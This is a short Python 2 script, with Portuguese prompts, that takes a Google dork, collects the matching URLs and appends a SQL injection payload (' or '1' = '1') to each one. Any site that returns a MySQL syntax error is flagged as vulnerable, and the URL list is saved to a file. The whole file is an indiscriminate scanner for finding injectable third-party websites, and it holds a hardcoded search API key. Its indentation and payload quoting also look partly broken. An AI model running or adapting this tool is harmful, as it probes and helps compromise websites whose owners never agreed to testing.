"""
https://github.com/allfro/pymetasploit
"""
import requests
from google import search

def main():
    print "Scan Google"       
    buscar = search.GoogleEngine("777c64eaf7b22ead16668198b16266e1")    
    string_busca = raw_input("Dork (as root): ")
    urls = buscar.search(string_busca)
    
    print 'Total de resultados: ' + str(len(urls))
    for fullurl in urls:
		try:
			resp = requests.get(fullurl + "=1\' or \'1\' = \'1\''", headers=buscar.request_headers)
			body = resp.text
			fullbody = body
			if "You have an error in your SQL syntax" in fullbody:
				print (fullurl + " --> SQL injection vulnerable!")
		except requests.exceptions.ConnectionError:
			pass

    nome_arquivo = raw_input("Nome do arquivo que deseja salvar: ")


    with open(nome_arquivo, "w") as f:        
        f.writelines("\n".join(urls))

        f.close()

    print "\n\nFIM!"




if __name__ == "__main__":
    main()
